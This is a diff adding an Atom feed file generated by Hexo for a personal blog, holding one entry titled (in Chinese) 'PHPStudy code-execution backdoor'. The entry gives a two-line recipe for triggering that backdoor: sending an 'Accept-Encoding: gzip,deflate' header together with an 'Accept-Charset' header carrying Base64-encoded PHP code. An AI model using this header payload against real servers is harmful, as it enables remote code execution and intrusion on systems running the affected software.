@@ -1,0 +1,40 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Hexo</title>
+  
+  
+  <link href="http://example.com/atom.xml" rel="self"/>
+  
+  <link href="http://example.com/"/>
+  <updated>2022-04-23T20:05:33.244Z</updated>
+  <id>http://example.com/</id>
+  
+  <author>
+    <name>iZero</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PHPStudy代码执行后门</title>
+    <link href="http://example.com/2022/04/24/PHPStudy%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%90%8E%E9%97%A8/"/>
+    <id>http://example.com/2022/04/24/PHPStudy%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%90%8E%E9%97%A8/</id>
+    <published>2022-04-23T20:03:29.000Z</published>
+    <updated>2022-04-23T20:05:33.244Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="后门利用"><a href="#后门利用" class="headerlink" title="后门利用"></a>后门利用</h1><p>在HTTP头中添加两个字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: Base64编码(PHP代码)</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;后门利用&quot;&gt;&lt;a href=&quot;#后门利用&quot; class=&quot;headerlink&quot; title=&quot;后门利用&quot;&gt;&lt;/a&gt;后门利用&lt;/h1&gt;&lt;p&gt;在HTTP头中添加两个字段&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+</feed>
